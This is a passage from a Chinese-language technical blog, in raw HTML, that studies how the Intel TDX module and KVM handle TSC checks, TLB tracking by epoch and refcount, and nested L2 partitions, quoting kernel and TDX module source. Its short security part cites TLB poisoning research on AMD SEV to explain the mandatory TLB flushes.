href=\"https://zhuanlan.zhihu.com/p/414698448\">https://zhuanlan.zhihu.com/p/414698448</a></p>\n<blockquote>\n<p>这篇 LKML 讨论中提及到，一些 BIOS SMI（System Management Interruption，系统管理中断）处理程序会通过修改 TSC 值隐藏其执行时间</p>\n</blockquote>\n<p>检查 tsc 是否被修改， 上次 exit 的 tsc 是否比 enter 时的要小</p>\n<p>是否是 tdx 依赖 tsc 提供精确的时间 避免 hypervisor 修改了 tsc 导致 tdx module 功能不正常？</p>\n<ul>\n<li>preemption timer set_vmx_preemption_timer 每次进 guest 前会调用  但这个功能是不是不太用？</li>\n<li>Tdx module 正常处理会需要拿锁(tdcall) 如果拿锁失败会返回 TDX_OPERAND_BUSY_HOST_PRIORITY 当某次拿锁失败离第一次失败的时间超过阈值 会直接返回到 VMM(如果没超过阈值就返回 guest)</li>\n<li>migration  计算 guestTD 视角的 virtual tsc</li>\n</ul>\n<h3 id=\"Tlb-tracking\"><a href=\"#Tlb-tracking\" class=\"headerlink\" title=\"Tlb tracking\"></a>Tlb tracking</h3><p>9.7</p>\n<blockquote>\n<p>TLB tracking is required when removing a mapped TD private page (TDH.MEM.PAGE.REMOVE) or when changing the page mapping size (TDH.MEM.PAGE.PROMOTE), etc.</p>\n<p>This sequence is intended to be used by the host VMM to help guarantee no EPT TLB entries exist to a set of GPA ranges.</p>\n</blockquote>\n<p>全局：tdcs</p>\n<p>percpu:tdvps</p>\n<p>每次 vpenter 的时候更新 tdvps &lt;- tdcs 如果 epoch 不一致就刷新</p>\n<p>epoch 是每次调 mem_track 的时候会 ++</p>\n<p>refcount 是统计上一轮有没有同步完成 每次 vmexit 的时候每个 vcpu 会-1 每次 vmenter 每个 vcpu 会 +1</p>\n<p>如果没有同步完成 mem_track 会返回错误 然后 tdx_track 会 while 重复尝试直到成功</p>\n<p>在 sept_flush_remote_tlbs</p>\n<p>sept_remove_private_spte</p>\n<p>flush_tlb_current</p>\n<p>的时候调用</p>\n<p>为什么不直接 smp_call_function_many(allcpu, tdx_flush_vp)   实际上只有__tdx_mmu_release_hkid 调了这个</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * @struct epoch_and_refcount_t</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * @brief Holds the epoch and refcount in a 128bit structure</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">epoch_and_refcount_s</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span></span></span><br><span class=\"line\"><span class=\"class\">    &#123;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">        &#123;</span></span><br><span class=\"line\">            <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">             * The TD epoch counter. This counter is incremented by the host VMM using the TDHMEMTRACK function</span></span><br><span class=\"line\"><span class=\"comment\">             */</span></span><br><span class=\"line\">            <span class=\"type\">uint64_t</span>       td_epoch;</span><br><span class=\"line\">            <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">             * Each REFCOUNT counts the number of LPs which may have TLB entries created</span></span><br><span class=\"line\"><span class=\"comment\">             * during a specific TD_EPOCH, and that are currently executing in TDX non-root mode</span></span><br><span class=\"line\"><span class=\"comment\">             */</span></span><br><span class=\"line\">            <span class=\"type\">uint16_t</span>       refcount[<span class=\"number\">2</span>];</span><br><span class=\"line\">            <span class=\"type\">uint8_t</span>        reserved[TDX_SIZE_OF_EPOCH_REFCOUNT_RESERVED_IN_BYTES];</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">uint128_t</span> raw;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"type\">epoch_and_refcount_t</span>;</span><br></pre></td></tr></table></figure>\n\n<p>kvm</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * TLB shoot down procedure:</span></span><br><span class=\"line\"><span class=\"comment\"> * There is a global epoch counter and each vcpu has local epoch counter.</span></span><br><span class=\"line\"><span class=\"comment\"> * - TDH.MEM.RANGE.BLOCK(TDR. level, range) on one vcpu</span></span><br><span class=\"line\"><span class=\"comment\"> *   This blocks the subsequenct creation of TLB translation on that range.</span></span><br><span class=\"line\"><span class=\"comment\"> *   This corresponds to clear the present bit(all RXW) in EPT entry</span></span><br><span class=\"line\"><span class=\"comment\"> * - TDH.MEM.TRACK(TDR): advances the epoch counter which is global.</span></span><br><span class=\"line\"><span class=\"comment\"> * - IPI to remote vcpus</span></span><br><span class=\"line\"><span class=\"comment\"> * - TDExit and re-entry with TDH.VP.ENTER on remote vcpus</span></span><br><span class=\"line\"><span class=\"comment\"> * - On re-entry, TDX module compares the local epoch counter with the global</span></span><br><span class=\"line\"><span class=\"comment\"> *   epoch counter.  If the local epoch counter is older than the global epoch</span></span><br><span class=\"line\"><span class=\"comment\"> *   counter, update the local epoch counter and flushes TLB.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">tdx_track</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm *kvm)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_tdx</span> *<span class=\"title\">kvm_tdx</span> =</span> to_kvm_tdx(kvm);</span><br><span class=\"line\">        u64 err;</span><br><span class=\"line\"></span><br><span class=\"line\">        KVM_BUG_ON(!is_hkid_assigned(kvm_tdx), kvm);</span><br><span class=\"line\">        <span class=\"comment\">/* If TD isn&#x27;t finalized, it&#x27;s before any vcpu running. */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (unlikely(!is_td_finalized(kvm_tdx)))</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * tdx_flush_tlb() waits for this function to issue TDH.MEM.TRACK() by</span></span><br><span class=\"line\"><span class=\"comment\">         * the counter.  The counter is used instead of bool because multiple</span></span><br><span class=\"line\"><span class=\"comment\">         * TDH_MEM_TRACK() can be issued concurrently by multiple vcpus.</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * optimization: The TLB shoot down procedure described in The TDX</span></span><br><span class=\"line\"><span class=\"comment\">         * specification is, TDH.MEM.TRACK(), send IPI to remote vcpus, confirm</span></span><br><span class=\"line\"><span class=\"comment\">         * all remote vcpus exit to VMM, and execute vcpu, both local and</span></span><br><span class=\"line\"><span class=\"comment\">         * remote.  Twist the sequence to reduce IPI overhead as follows.</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * local                        remote</span></span><br><span class=\"line\"><span class=\"comment\">         * -----                        ------</span></span><br><span class=\"line\"><span class=\"comment\">         * increment tdh_mem_track</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * request KVM_REQ_TLB_FLUSH</span></span><br><span class=\"line\"><span class=\"comment\">         * send IPI</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         *                                TDEXIT to KVM due to IPI</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         *                                IPI handler calls tdx_flush_tlb()</span></span><br><span class=\"line\"><span class=\"comment\">         *                              to process KVM_REQ_TLB_FLUSH.</span></span><br><span class=\"line\"><span class=\"comment\">         *                                spin wait for tdh_mem_track == 0</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * TDH.MEM.TRACK()</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * decrement tdh_mem_track</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         *                                complete KVM_REQ_TLB_FLUSH</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * TDH.VP.ENTER to flush tlbs        TDH.VP.ENTER to flush tlbs</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"type\">atomic_inc</span>(&amp;kvm_tdx-&gt;tdh_mem_track);</span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * KVM_REQ_TLB_FLUSH waits for the empty IPI handler, ack_flush(), with</span></span><br><span class=\"line\"><span class=\"comment\">         * KVM_REQUEST_WAIT.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        kvm_make_all_cpus_request(kvm, KVM_REQ_TLB_FLUSH);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">                err = tdh_mem_track(kvm_tdx-&gt;tdr_pa);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">while</span> (unlikely((err &amp; TDX_SEAMCALL_STATUS_MASK) == TDX_OPERAND_BUSY));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Release remote vcpu waiting for TDH.MEM.TRACK in tdx_flush_tlb(). */</span></span><br><span class=\"line\">        <span class=\"type\">atomic_dec</span>(&amp;kvm_tdx-&gt;tdh_mem_track);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (KVM_BUG_ON(err, kvm))</span><br><span class=\"line\">                pr_tdx_error(TDH_MEM_TRACK, err, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里并不会调 tdx module 的 tdh_vp_flush  而是等 tdh_mem_track 完成 进 vm 的时候在 vpenter 里面刷</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">tdx_flush_tlb</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Don&#x27;t need to flush shared EPTP:</span></span><br><span class=\"line\"><span class=\"comment\">         * &quot;TD VCPU TLB Address Spaced Identifier&quot; in the TDX module spec:</span></span><br><span class=\"line\"><span class=\"comment\">         * The TLB entries for TD are tagged with:</span></span><br><span class=\"line\"><span class=\"comment\">         *  SEAM (1 bit)</span></span><br><span class=\"line\"><span class=\"comment\">         *  VPID</span></span><br><span class=\"line\"><span class=\"comment\">         *  Secure EPT root (51:12 bits) with HKID = 0</span></span><br><span class=\"line\"><span class=\"comment\">         *  PCID</span></span><br><span class=\"line\"><span class=\"comment\">         * for *both* Secure-EPT and Shared-EPT.</span></span><br><span class=\"line\"><span class=\"comment\">         * TLB flush with Secure-EPT root by tdx_track() results in flushing</span></span><br><span class=\"line\"><span class=\"comment\">         * the conversion of both Secure-EPT and Shared-EPT.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * See tdx_track().  Wait for tlb shootdown initiater to finish</span></span><br><span class=\"line\"><span class=\"comment\">         * TDH_MEM_TRACK() so that shared-EPT/secure-EPT TLB is flushed</span></span><br><span class=\"line\"><span class=\"comment\">         * on the next TDENTER.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"type\">atomic_read</span>(&amp;to_kvm_tdx(vcpu-&gt;kvm)-&gt;tdh_mem_track))</span><br><span class=\"line\">                cpu_relax();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>vmm_dispatcher</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">api_error_type <span class=\"title function_\">tdh_mem_track</span><span class=\"params\">(<span class=\"type\">uint64_t</span> target_tdr_pa)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// TDR related variables</span></span><br><span class=\"line\">    <span class=\"type\">pa_t</span>                  tdr_pa;                    <span class=\"comment\">// TDR physical address</span></span><br><span class=\"line\">    <span class=\"type\">tdr_t</span>               * tdr_ptr;                   <span class=\"comment\">// Pointer to the TDR page (linear address)</span></span><br><span class=\"line\">    <span class=\"type\">pamt_block_t</span>          tdr_pamt_block;            <span class=\"comment\">// TDR PAMT block</span></span><br><span class=\"line\">    <span class=\"type\">pamt_entry_t</span>        * tdr_pamt_entry_ptr;        <span class=\"comment\">// Pointer to the TDR PAMT entry</span></span><br><span class=\"line\">    <span class=\"type\">bool_t</span>                tdr_locked_flag = <span class=\"literal\">false</span>;   <span class=\"comment\">// Indicate TDR is locked</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">tdcs_t</span>              * tdcs_ptr = <span class=\"literal\">NULL</span>;           <span class=\"comment\">// Pointer to the TDCS structure (Multi-page)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">bool_t</span>                epoch_locked_flag = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    api_error_type        return_val = UNINITIALIZE_ERROR;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    tdr_pa.raw = target_tdr_pa;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check, lock and map the owner TDR page</span></span><br><span class=\"line\">    return_val = check_lock_and_map_explicit_tdr(tdr_pa,</span><br><span class=\"line\">                                                 OPERAND_ID_RCX,</span><br><span class=\"line\">                                                 TDX_RANGE_RO,</span><br><span class=\"line\">                                                 TDX_LOCK_SHARED,</span><br><span class=\"line\">                                                 PT_TDR,</span><br><span class=\"line\">                                                 &amp;tdr_pamt_block,</span><br><span class=\"line\">                                                 &amp;tdr_pamt_entry_ptr,</span><br><span class=\"line\">                                                 &amp;tdr_locked_flag,</span><br><span class=\"line\">                                                 &amp;tdr_ptr);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (return_val != TDX_SUCCESS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;Failed to check/lock/map a TDR - error = %llx\\n&quot;</span>, return_val);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Map the TDCS structure and check the state</span></span><br><span class=\"line\">    return_val = check_state_map_tdcs_and_lock(tdr_ptr, TDX_RANGE_RW, TDX_LOCK_SHARED,</span><br><span class=\"line\">                                               <span class=\"literal\">false</span>, TDH_MEM_TRACK_LEAF, &amp;tdcs_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (return_val != TDX_SUCCESS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;State check or TDCS lock failure - error = %llx\\n&quot;</span>, return_val);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Lock the TD epoch</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (acquire_sharex_lock_ex(&amp;tdcs_ptr-&gt;epoch_tracking.epoch_lock)</span><br><span class=\"line\">                                != LOCK_RET_SUCCESS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;Could not lock the TD epoch\\n&quot;</span>);</span><br><span class=\"line\">        return_val = api_error_with_operand_id(TDX_OPERAND_BUSY, OPERAND_ID_TD_EPOCH);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    epoch_locked_flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Verify that no VCPUs are associated with the previous epoch</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> td_epoch = tdcs_ptr-&gt;epoch_tracking.epoch_and_refcount.td_epoch;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span>* refcount = tdcs_ptr-&gt;epoch_tracking.epoch_and_refcount.refcount;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (refcount[<span class=\"number\">1</span> - (td_epoch  &amp; <span class=\"number\">1</span>)] != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;VCPU associated with the previous epoch\\n&quot;</span>);</span><br><span class=\"line\">        return_val = TDX_PREVIOUS_TLB_EPOCH_BUSY;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ALL_CHECKS_PASSED:  The function is guaranteed to succeed</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Switch to the next TD epoch.  Note that since we only have 2 REFCOUNTs,</span></span><br><span class=\"line\">    <span class=\"comment\">// the previous epoch&#x27;s REFCOUNT, verified above to be 0, is now the</span></span><br><span class=\"line\">    <span class=\"comment\">// current epoch&#x27;s REFCOUNT.</span></span><br><span class=\"line\">    <span class=\"comment\">// TD_EPOCH&#x27;s bit 63 must be 0 since this is a special range used for migration.</span></span><br><span class=\"line\">    <span class=\"comment\">// This can&#x27;t happen in practice (it would take thousands of years)</span></span><br><span class=\"line\">    tdcs_ptr-&gt;epoch_tracking.epoch_and_refcount.td_epoch++;</span><br><span class=\"line\"></span><br><span class=\"line\">EXIT:</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (epoch_locked_flag)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        release_sharex_lock_ex(&amp;tdcs_ptr-&gt;epoch_tracking.epoch_lock);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(tdcs_ptr != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        release_sharex_lock_hp_sh(&amp;tdcs_ptr-&gt;management_fields.op_state_lock);</span><br><span class=\"line\">        free_la(tdcs_ptr);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdr_locked_flag)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        pamt_unwalk(tdr_pa, tdr_pamt_block, tdr_pamt_entry_ptr, TDX_LOCK_SHARED, PT_4KB);</span><br><span class=\"line\">        free_la(tdr_ptr);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> return_val;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://www.felixcloutier.com/x86/invept\">https://www.felixcloutier.com/x86/invept</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">_STATIC_INLINE_ <span class=\"type\">void</span> <span class=\"title function_\">flush_td_asid</span><span class=\"params\">(<span class=\"type\">tdr_t</span>* tdr_ptr, <span class=\"type\">tdcs_t</span>* tdcs_ptr, <span class=\"type\">uint16_t</span> vm_id)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">ia32e_eptp_t</span> eptp = get_l2_septp(tdr_ptr, tdcs_ptr, vm_id);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">ept_descriptor_t</span> ept_desc = &#123;.ept = eptp.raw, .reserved = <span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    ia32_invept(&amp;ept_desc, INVEPT_SINGLE_CONTEXT);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">_STATIC_INLINE_ <span class=\"type\">void</span> <span class=\"title function_\">flush_all_td_asids</span><span class=\"params\">(<span class=\"type\">tdr_t</span>* tdr_ptr, <span class=\"type\">tdcs_t</span>* tdcs_ptr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// Execute INVEPT type 1 for each Secure EPT</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">uint16_t</span> vm_id = <span class=\"number\">0</span>; vm_id &lt;= tdcs_ptr-&gt;management_fields.num_l2_vms; vm_id++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        flush_td_asid(tdr_ptr, tdcs_ptr, vm_id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">invalidate_gpa_translations</span><span class=\"params\">(<span class=\"type\">tdvps_t</span> *tdvps_ptr, <span class=\"type\">uint16_t</span> vm_id)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    tdvps_ptr-&gt;management.l2_enter_guest_state_hpa[vm_id] = NULL_PA;</span><br><span class=\"line\">    tdvps_ptr-&gt;management.l2_vapic_hpa[vm_id] = NULL_PA;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">invalidate_all_gpa_translations</span><span class=\"params\">(<span class=\"type\">tdcs_t</span>* tdcs_p, <span class=\"type\">tdvps_t</span>* tdvps_p)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">uint16_t</span> vm_id = <span class=\"number\">0</span>; vm_id &lt;= tdcs_p-&gt;management_fields.num_l2_vms; vm_id++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        invalidate_gpa_translations(tdvps_p, vm_id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Partition\"><a href=\"#Partition\" class=\"headerlink\" title=\"Partition\"></a>Partition</h4><p>嵌套虚拟化 td 可分为 L1 VMM L2 VM</p>\n<p>management.curr_vm&#x3D;0 表示是 L1  否则是 L2VM 的编号</p>\n<p>tdh_mng_init 初始化</p>\n<p>Kvm setup_tdparams  td_params 在 kvm 的结构体中并没有 num_l2_vms kernel 并没有支持嵌套虚拟化？</p>\n<p>所有涉及到 l2_enter_guest_state_hpa 的操作不在非嵌套虚拟化的路径中</p>\n<p>并且由于 num_l2_vms 是 0  invalidate_all_gpa_translations 相当于是空的</p>\n<h4 id=\"Security\"><a href=\"#Security\" class=\"headerlink\" title=\"Security\"></a>Security</h4><p>hypervisor 不刷 tlb</p>\n<p><u>TLB Poisoning Attacks on AMD Secure Encrypted Virtualization</u></p>\n<p>同一个 lp 调度不同 vcpu 时不刷</p>\n<p><a href=\"https://www.amd.com/en/resources/product-security/bulletin/amd-sb-1023.html\">https://www.amd.com/en/resources/product-security/bulletin/amd-sb-1023.html</a></p>\n<p>amd 硬件强制刷</p>\n<p>tdx_vcpu_load 和 pre_sev_run 有差不多的逻辑 换 vcpu 就要刷</p>\n<p>刷完以后 tdx module 把 tdvps_ptr-&gt;management.assoc_lpid 写为-1 即 VCPU_NO_LP</p>\n<p>在每次 tdh_vp_enter 的时候都会检查 lpid 要么不变要么为-1 否则返回错误</p>\n<p>并且 tdh_vp_enter 也会检查当前 vcpu 和上一次是否一致 不一致就刷</p>\n<blockquote>\n<p>The same ASID based on the TD’s EPTP is used for caching both secure and shared EPT translations (remember: EPTP is the HPA of the **secure **EPT root page). Thus, to flush shared EPT translations, the host VMM uses INVEPT specifying the TD’s EPTP, not its Shared EPTP. The host VMM can obtain the value of EPTP from the TD VMCSs using TDH.VP.RD.</p>\n<p>An alternative method the host VMM may use is to do TLB tracking similar to how it’s done for Secure EPT, i.e., execute TDH.MEM.TRACK and a round of IPI. Contrary to Secure EPT, this is not enforced by the TDX module.</p>\n</blockquote>\n<p>epoch 只在 tdx_mem_track 中更改</p>\n<p>tdx_mem_track 只由 kvm 调用</p>\n<p>9.15 <strong>Removing a Secure EPT Page: TDH.MEM.SEPT.REMOVE</strong></p>\n<blockquote>\n<p>The host VMM can remove a Secure EPT page using TDH.MEM.SEPT.REMOVE, freeing it for any use, provided all its 35 entries are FREE. The host VMM should first perform the TLB tracking protocol on the page.<br>The host VMM should first call TDH.MEM.RANGE.BLOCK on the Secure EPT page. TDH.MEM.RANGE.BLOCK marks the parent EPT entry for that page as **BLOCKED **and records the TD epoch in the PAMT entry of the page.</p>\n<p>Typically, the host VMM then calls TDH.MEM.TRACK and performs a round of IPIs. After that, there should be no active address translation to GPA range presented by the Secure EPT page to be removed</p>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//tdh_mem_sept_remove</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sept_state_is_tlb_tracking_required(sept_entry_copy) &amp;&amp;</span><br><span class=\"line\">        op_state_is_tlb_tracking_required(tdcs_ptr-&gt;management_fields.op_state))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// The TD may be running and this page must be blocked and tracked before it&#x27;s removed.</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Verify the entry is *BLOCKED (originally MAPPED or PENDING)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!sept_state_is_any_blocked(sept_entry_copy))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            return_val = api_error_with_operand_id(TDX_GPA_RANGE_NOT_BLOCKED, OPERAND_ID_RCX);</span><br><span class=\"line\">            set_arch_septe_details_in_vmm_regs(sept_entry_copy, gpa_mappings.level, local_data_ptr);</span><br><span class=\"line\">            TDX_ERROR(<span class=\"string\">&quot;Removed SEPT entry is not blocked - 0x%llx\\n&quot;</span>, sept_entry_copy.raw);</span><br><span class=\"line\">            <span class=\"keyword\">goto</span> EXIT;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Verify the TLB tacking of the blocked Secure-EPT page has been completed</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!is_tlb_tracked(tdcs_ptr, removed_page_pamt_entry_ptr[<span class=\"number\">0</span>]-&gt;bepoch))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            TDX_ERROR(<span class=\"string\">&quot;Removed SEPT page TLB tracking is not complete\\n&quot;</span>);</span><br><span class=\"line\">            return_val = api_error_with_operand_id(TDX_TLB_TRACKING_NOT_DONE, OPERAND_ID_RCX);</span><br><span class=\"line\">            <span class=\"keyword\">goto</span> EXIT;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>tdh_mem_range_block-&gt;block_sept_entry 每个 septe 会记录是否被 block</p>\n<p>如果 kvm 没有调用 tdh_mem_range_block  tdx module 会检查并报错</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * @brief Checks TLB tracking conditions</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * @param tdcs_t Pointer to TDCS for reading TD&#x27;s epoch value and refcount</span></span><br><span class=\"line\"><span class=\"comment\"> * @param bepoch The EPOCH value that needs to be checked if tracked</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">_STATIC_INLINE_ <span class=\"type\">bool_t</span> <span class=\"title function_\">is_tlb_tracked</span><span class=\"params\">(<span class=\"type\">tdcs_t</span> * tdcs_ptr, <span class=\"type\">bepoch_t</span> bepoch)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (bepoch.mig_flag)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">epoch_and_refcount_t</span> epoch_and_refcount = &#123;</span><br><span class=\"line\">            .raw = _lock_read_128b(&amp;tdcs_ptr-&gt;epoch_tracking.epoch_and_refcount.raw)</span><br><span class=\"line\">                                              &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((bepoch.raw == epoch_and_refcount.td_epoch - <span class=\"number\">1</span>) &amp;&amp;</span><br><span class=\"line\">        (epoch_and_refcount.refcount[bepoch.raw &amp; <span class=\"number\">1</span>] == <span class=\"number\">0</span>))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (bepoch.raw &lt; epoch_and_refcount.td_epoch - <span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>bepoch 在 tdh_mem_range_block 的时候设为 